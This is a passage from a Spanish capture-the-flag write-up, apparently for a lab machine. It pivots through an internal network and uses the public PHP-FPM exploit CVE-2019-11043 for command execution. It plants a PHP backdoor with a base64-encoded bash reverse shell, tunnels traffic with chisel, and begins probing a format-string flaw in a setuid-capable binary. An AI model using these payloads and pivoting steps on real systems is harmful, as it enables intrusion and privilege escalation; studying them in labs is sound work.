</span></span><span style=display:flex><span>www-data@web:/tmp$ wget 172.30.0.9/port_scan.sh
</span></span><span style=display:flex><span>www-data@web:/tmp$ bash port_scan.sh
</span></span><span style=display:flex><span>Port: 80 OPEN
</span></span></code></pre></div><p>En menos de 5 minutos tenemos todos los resultados. Solamente el puerto 80 (HTTP) está abierto en <code>pki</code>, el cual aparecerá como resultado del escaneo en pocos segundos.</p><p>Entonces, podemos realizar un reenvío de puertos con SSH (se puede escribir <code>ENTER</code> + <code>~C</code> para salir temporalmente de la sesión de SSH y obtener la interfaz <code>ssh></code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/tmp$
</span></span><span style=display:flex><span>ssh&gt; -L 8080:192.168.254.3:80
</span></span><span style=display:flex><span>Forwarding port.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>www-data@web:/tmp$
</span></span></code></pre></div><p>Tenemos la siguiente respuesta HTTP de <code>pki</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl 127.0.0.1:8080 -i
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
</span></span><span style=display:flex><span>Server<span style=color:#f92672>:</span> <span style=color:#ae81ff>nginx/1.14.0 (Ubuntu)</span>
</span></span><span style=display:flex><span>Date<span style=color:#f92672>:</span> <span style=color:#ae81ff>Wed, 10 Dec 2021 22:22:22 GMT</span>
</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>text/html; charset=UTF-8</span>
</span></span><span style=display:flex><span>Transfer-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>chunked</span>
</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>keep-alive</span>
</span></span><span style=display:flex><span>X-Powered-By<span style=color:#f92672>:</span> <span style=color:#ae81ff>PHP-FPM/7.1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>Esta respuesta es extraña puesto que muestra una especie de &ldquo;panel de ayuda&rdquo; de un binario llamado <code>ersatool</code>. Si aplicamos <em>fuzzing</em> podemos encontrar más rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w $WORDLISTS/dirb/common.txt -u http://127.0.0.1:8080/FUZZ
</span></span><span style=display:flex><span>                        [Status: 200, Size: 53, Words: 5, Lines: 2]
</span></span><span style=display:flex><span>index.php               [Status: 200, Size: 50022, Words: 6940, Lines: 305]
</span></span><span style=display:flex><span>uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8]
</span></span></code></pre></div><p>Existe un directorio <code>/uploads</code>, pero el listado de directorios está deshabilitado.</p><h2 id=comprometiendo-otro-servidor-interno>Comprometiendo otro servidor interno</h2><p>Desde la respuesta HTTP anterior, se puede ver que el servidor está utilizando PHP-FPM/7.1. Existe un <em>exploit</em> para esta tecnología, demostrada <a href=https://github.com/neex/phuip-fpizdam>aquí</a> (CVE-2019-11043).</p><p>El <em>exploit</em> consiste en un proyecto en Go que expone una <em>web-shell</em> en la víctima. Vamos a compilar el proyecto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ git clone https://github.com/neex/phuip-fpizdam
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ cd phuip-fpizdam
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ go build --ldflags<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;-s -w&#39;</span> .
</span></span><span style=display:flex><span>go: downloading github.com/spf13/cobra v0.0.5
</span></span><span style=display:flex><span>go: downloading github.com/spf13/pflag v1.0.3
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ upx phuip-fpizdam
</span></span></code></pre></div><p>Después de leer la información básica del <em>exploit</em>, podemos ejecutarlo así:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ./phuip-fpizdam http://127.0.0.1:8080/index.php
</span></span><span style=display:flex><span>Base status code is 200
</span></span><span style=display:flex><span>Status code 502 for qsl=1765, adding as a candidate
</span></span><span style=display:flex><span>The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
</span></span><span style=display:flex><span>Attack params found: --qsl 1755 --pisos 38 --skip-detect
</span></span><span style=display:flex><span>Trying to set &#34;session.auto_start=0&#34;...
</span></span><span style=display:flex><span>Detect() returned attack params: --qsl 1755 --pisos 38 --skip-detect &lt;-- REMEMBER THIS
</span></span><span style=display:flex><span>Performing attack using php.ini settings...
</span></span><span style=display:flex><span>Success! Was able to execute a command by appending &#34;?a=/bin/sh+-c+&#39;which+which&#39;&amp;&#34; to URLs
</span></span><span style=display:flex><span>Trying to cleanup /tmp/a...
</span></span><span style=display:flex><span>Done!
</span></span></code></pre></div><p>Como dice en la salida del programa, ahora tenemos un parámetro en la URL en el que poner nuestros comandos de sistema:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+&#39;which+which&#39;&amp;&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/which
</span></span><span style=display:flex><span>&lt;br /&gt;
</span></span><span style=display:flex><span>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br
</span></span><span style=display:flex><span> /&gt;
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>Cabe mencionar que el comando no siempre funciona. Es necesario enviar la petición unas tres o cuatro veces para ejecutar el comando.</p><p>Utilizando este RCE, podemos realizar una enumeración básica del sistema:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+&#39;whoami&#39;&amp;&#34;</span>
</span></span><span style=display:flex><span>www-data
</span></span><span style=display:flex><span>&lt;br /&gt;
</span></span><span style=display:flex><span>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br
</span></span><span style=display:flex><span> /&gt;
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ curl <span style=color:#e6db74>&#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+&#39;ls+-la&#39;&amp;&#34;</span>
</span></span><span style=display:flex><span>total 16
</span></span><span style=display:flex><span>drwxr-xr-x 3 root     root     4096 Apr  4  2020 .
</span></span><span style=display:flex><span>drwxr-xr-x 3 root     root     4096 Mar 27  2020 ..
</span></span><span style=display:flex><span>-rw-r--r-- 1 root     root      174 Apr  4  2020 index.php
</span></span><span style=display:flex><span>drwxr-xr-x 2 www-data www-data 4096 Mar 27  2020 uploads
</span></span><span style=display:flex><span>&lt;br /&gt;
</span></span><span style=display:flex><span>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /tmp/a:1) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;2&lt;/b&gt;&lt;br /&gt;
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>Sin embargo, sería mucho más útil tener una consola de comandos. Para ello, se puede añadir un archivo PHP en el directorio <code>/uploads</code> con un comando a nivel de sistema que envíe una <em>reverse shell</em>.</p><p>Nótese que <code>pki</code> no tiene conectividad con la máquina de atacante. Por tanto, la <em>reverse shell</em> tiene que ser enviada a <code>web</code> (<code>192.168.254.2</code>). Y una vez en <code>web</code>, el tráfico será redirigido a la máquina de atacante (<code>172.30.0.9</code>) utilizando un reenvío de puertos con <a href=https://github.com/jpillora/chisel><code>chisel</code></a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/192.168.254.2/4444  0&gt;&amp;1&#39;</span> | base64
</span></span><span style=display:flex><span>YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx
</span></span></code></pre></div><p>El archivo PHP se llamará <code>b4ckd0or.php</code> y tendrá el siguiente contenido:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64 -d|bash&#34;</span>); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>La enumeración anterior nos dice que no existe <code>nc</code>, <code>curl</code> ni <code>wget</code>. Entonces, la mejor manera de escribir este archivo es utilizando <code>echo</code> y redirigiendo la salida. Hay que tener cuidado también con la codificación URL:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#34;http://127.0.0.1:8080/index.php?a=echo+&#39;&lt;?php+system(\&#34;echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64+-d|bash\&#34;);+?&gt;&#39;+&gt;+uploads/b4ckd0or.php;echo+asdf&amp;&#34;</span>
</span></span><span style=display:flex><span>asdf
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span></code></pre></div><p>Nótese que añadí un comando <code>echo asdf</code> para saber que el comando se había ejecutado correctamente (recuérdese que hasta la tercera o cuarta petición, el comando no funciona).</p><p>Ahora necesitamos transferir <a href=https://github.com/jpillora/chisel><code>chisel</code></a> a la máquina <code>web</code> (utilizando un servidor HTTP con Python desde la máquina de atacante):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/tmp$ wget 172.30.0.9/chisel
</span></span><span style=display:flex><span>www-data@web:/tmp$ mv chisel .chisel
</span></span><span style=display:flex><span>www-data@web:/tmp$ chmod +x .chisel
</span></span></code></pre></div><p>La máquina <code>web</code> será el servidor, en escucha en el puerto 1337:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/tmp$ ./.chisel server -p 1337 --reverse
</span></span><span style=display:flex><span>server: Reverse tunnelling enabled
</span></span><span style=display:flex><span>server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E=
</span></span><span style=display:flex><span>server: Listening on http://0.0.0.0:1337
</span></span></code></pre></div><p>Y la máquina de atacante se conectará al servidor (<code>172.20.0.10:1337</code>) y le dirá que reenvíe todo lo que llegue a <code>192.168.254.2:4444</code> (máquina <code>web</code>) al puerto 4444 (máquina de atacante):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ./chisel client 172.20.0.10:1337 R:192.168.254.2:4444:0.0.0.0:4444
</span></span><span style=display:flex><span>client: Connecting to ws://172.20.0.10:1337
</span></span><span style=display:flex><span>client: Connected (Latency 82.064375ms)
</span></span></code></pre></div><p>La salida del comando del servidor indica cómo está establecida la conexión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/tmp$ ./.chisel server -p 1337 --reverse
</span></span><span style=display:flex><span>server: Reverse tunnelling enabled
</span></span><span style=display:flex><span>server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E=
</span></span><span style=display:flex><span>server: Listening on http://0.0.0.0:1337
</span></span><span style=display:flex><span>server: session#1: tun: proxy#R:192.168.254.2:4444=&gt;0.0.0.0:4444: Listening
</span></span></code></pre></div><p>Ahora podemos hacer una petición al archivo <code>/uploads/b4ckd0or.php</code> y ganar una conexión por <em>reverse shell</em> en la máquina <code>pki</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://127.0.0.1:8080/uploads/b4ckd0or.php
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 127.0.0.1.
</span></span><span style=display:flex><span>Ncat: Connection from 127.0.0.1:59809.
</span></span><span style=display:flex><span>bash: cannot set terminal process group (11): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ script /dev/null -c bash
</span></span><span style=display:flex><span>script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ export TERM=xterm
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ export SHELL=bash
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ stty rows 50 columns 158
</span></span></code></pre></div><h2 id=encontrando-una-vulnerabilidad-de-_format-string_>Encontrando una vulnerabilidad de <em>Format String</em></h2><p>Estamos como usuario <code>www-data</code>. Esta máquina <code>pki</code> es un contenedor de Docker (ya que tiene un <code>.dockerenv</code> y solo unos pocos comandos instalados):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ ls -a /
</span></span><span style=display:flex><span>.   .dockerenv  boot  entry.sh  home  lib64  mnt  php-src  root  sbin  sys  usr
</span></span><span style=display:flex><span>..  bin         dev   etc       lib   media  opt  proc     run   srv   tmp  var
</span></span></code></pre></div><p>Si enumeramos <em>capabilities</em> de sistema, vemos que el binario <code>ersatool</code> tiene <code>cap_setuid+eip</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ getcap -r / 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/bin/ersatool = cap_setuid+eip
</span></span></code></pre></div><p>Esto significa que en algunos puntos del programa el binario tiene permiso para realizar acciones con permisos elevados (como <code>root</code>). Veamos si hay más archivos relacionados con el binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ find / -name \*ersatool\* 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/src/ersatool.c
</span></span><span style=display:flex><span>/usr/bin/ersatool
</span></span></code></pre></div><p>Y tenemos el código fuente. Esto es bueno porque podemos saltarnos algunos procesos de ingeniería inversa.</p><p>El binario se utiliza para generar la VPN de los usuarios. Igual necesita ejecutarse como <code>root</code> durante algunas tareas para leer claves privadas, por ejemplo.</p><p>Después de mirar el código fuente, descubrimos una vulnerabilidad de <em>Format String</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>printCN</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>cn, <span style=color:#66d9ef>int</span> i) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> fn[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>100</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;print-&gt;CN=&#34;</span>);
</span></span><span style=display:flex><span>    fflush(stdout);
</span></span><span style=display:flex><span>    memset(buffer, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>    read(<span style=color:#ae81ff>0</span>, buffer, <span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    memset(buffer, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>    strncat(buffer, cn, <span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>strncmp(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buffer, <span style=color:#ae81ff>1</span>)) { <span style=color:#66d9ef>return</span>; }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span> {
</span></span><span style=display:flex><span>    strncpy(fn, OUTPUT_DIR, <span style=color:#66d9ef>sizeof</span>(fn));
</span></span><span style=display:flex><span>    strncat(fn, <span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>sizeof</span>(fn) <span style=color:#f92672>-</span> strlen(fn));
</span></span><span style=display:flex><span>    strncat(fn, strtok(basename(buffer), <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#66d9ef>sizeof</span>(fn) <span style=color:#f92672>-</span> strlen(fn));
</span></span><span style=display:flex><span>    strncat(fn, EXT, <span style=color:#66d9ef>sizeof</span>(fn) <span style=color:#f92672>-</span> strlen(fn));
</span></span><span style=display:flex><span>    printf(buffer); <span style=color:#75715e>//checking buffer content
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    filePrint(fn);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>      printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>print-&gt;CN=&#34;</span>);
</span></span><span style=display:flex><span>      fflush(stdout);
</span></span><span style=display:flex><span>      memset(buffer,<span style=color:#ae81ff>0</span>,<span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>      read(<span style=color:#ae81ff>0</span>,buffer,<span style=color:#66d9ef>sizeof</span>(buffer));
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>while</span> (strncmp(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buffer, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>¿Puedes verlo? Esta es la línea vulnerable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>printf(buffer); <span style=color:#75715e>//checking buffer content
</span></span></span></code></pre></div><p>La variable <code>buffer</code> viene directamente de la entrada del usuario, por lo que tenemos control sobre la variable.</p><p>Las vulnerabilidades de <em>Format String</em> son muy peligrosas porque podemos leer datos de la memoria e incluso escribir y modificar datos de la misma para obtener RCE.</p><p>La función <code>printf</code> utiliza <em>format strings</em> con caracteres especiales para imprimir los diferentes tipos de datos. Por ejemplo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1337</span>); <span style=color:#75715e>// Prints: 1337
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;7Rocky&#34;</span>); <span style=color:#75715e>// Prints: 7Rocky
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>printf(<span style=color:#e6db74>&#34;%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0xACDC</span>); <span style=color:#75715e>// Prints: acdc
</span></span></span></code></pre></div><p>El formato <code>%n</code> escribe el número de bytes escritos hasta el formato en la dirección dada como argumento precediendo al formato.</p><p>El problema es que tenemos control sobre la <em>format string</em>, ya que podemos hacer esto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ ersatool
</span></span><span style=display:flex><span>batch mode: /usr/bin/ersatool create|print|revoke CN
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ ersatool print %x
</span></span><span style=display:flex><span>ff35015f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
</span></span><span style=display:flex><span>www-data@pki:~/html/uploads$ ersatool
</span></span><span style=display:flex><span># print
</span></span><span style=display:flex><span>print-&gt;CN=%x
</span></span><span style=display:flex><span>ffe4827f[!] ERR reading /opt/easyrsa/clients/%x.ovpn!
</span></span><span style=display:flex><span>^C
</span></span></code></pre></div><p>Los valores <code>ff35015f</code> y <code>ffe4827f</code> son valores tomados de la pila (<em>stack</em>), estamos realizando una fuga de datos de memoria (<em>memory leak</em>).</p><p>Nótese que el programa se puede ejecutar en modo interactivo.</p><p>Podemos hacer un poco de <em>fuzzing</em> con Python para ver dónde se muestra la cadena <code>AAAA</code> situada antes de los formatos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ ersatool print $(python3 -c &#39;print(&#34;AAAA&#34; + &#34;%x.&#34; * 100)&#39;)
</span></span><span style=display:flex><span>AAAAf7b2915f.ab89b864.f7b2915f.0.78252e78.da4b5a98.ab89be4d.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.ab89b830.74706f2f.61737279.73746e65.2e782541.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.[!] ERR reading /opt/easyrsa/clients/AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.!
</span></span></code></pre></div><p>Como se puede observar, <code>41414141</code> (<code>AAAA</code> en código ASCII hexadecimal) aparece en la octava posición (<em>offset</em> <code>8</code>). Esto será importante para el proceso de explotación.</p><h2 id=configuración-de-red-para-la-explotación>Configuración de red para la explotación</h2><p>Primero, necesitamos montar un entorno de red para tener conectividad bidireccional entre <code>pki</code> y la máquina de atacante.</p><p>Un sentido ya está configurado:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>pki =&gt; 192.168.254.2:4444 (web) =&gt; 172.30.0.9:4444 (attacker)
</span></span></code></pre></div><p>Y el otro sentido será así:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>attacker =&gt; 127.0.0.1:1234 =&gt; (web) =&gt; 192.168.254.3:1234 (pki)
</span></span></code></pre></div><p>Las conexiones resultantes serán:</p><p><img src=/images/HTB/Static/Static-port-forwarding.png alt="Static port forwarding"></p><p>Para este propósito, podemos utilizar un reenvío de puertos con SSH como antes (<code>ENTER</code> + <code>~C</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@web:/tmp$
</span></span><span style=display:flex><span>ssh&gt; -L 1234:192.168.254.3:1234
</span></span><span style=display:flex><span>Forwarding port.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>www-data@web:/tmp$
</span></span></code></pre></div><p>Ahora podemos transferir fácilmente <code>ersatool</code> y <code>ersatool.c</code> a la máquina de atacante usando Python (afortunadamente, <code>pki</code> tiene <code>python3</code> instalado):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:~/html/uploads$ cd /
</span></span><span style=display:flex><span>www-data@pki:~/$ python3 -m http.server 1234
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ wget http://127.0.0.1:1234/usr/bin/ersatool
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ wget http://127.0.0.1:1234/usr/src/ersatool.c
</span></span></code></pre></div><p>Para desarrollar el <em>exploit</em>, necesitamos también la librería Glibc:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@pki:/$ ldd /usr/bin/ersatool
</span></span><span style=display:flex><span>        linux-vdso.so.1 (0x00007fff7f1f4000)
</span></span><span style=display:flex><span>        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9381921000)
</span></span><span style=display:flex><span>        /lib64/ld-linux-x86-64.so.2 (0x00007f9381d12000)
